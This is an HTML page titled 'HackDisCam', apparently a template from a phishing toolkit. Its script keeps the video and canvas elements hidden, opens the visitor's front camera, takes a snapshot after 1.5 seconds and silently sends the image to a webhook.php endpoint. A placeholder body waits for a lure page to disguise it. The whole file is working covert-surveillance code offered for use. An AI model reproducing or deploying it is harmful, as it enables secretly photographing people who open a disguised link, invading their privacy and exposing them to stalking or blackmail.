
<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport'/>
  <meta name="viewport" content="width=device-width"/>

  <title>HackDisCam</title>

  <script type="text/javascript" src="script.js"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

</head>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>

    function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'webhook.php',
        dataType: 'json',
        async: false,
        success: function(result){
            // call the function that handles the response/results
        },
        error: function(){
        }
      });
    };


    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
      audio: false,
      video: {
        
        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

    var context = canvas.getContext('2d');
      setTimeout(function(){

          context.drawImage(video, 0, 0, 640, 480);
          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
          for (let i=0 ; i<10000000 ; i++){
            let k = 0;
          }
          post(canvasData); }, 1500);
      

    }

    // Load init
    init();

  </script>

<body>

          <h1>
              Place your template here.
          </h1>

</body>
</html>

      
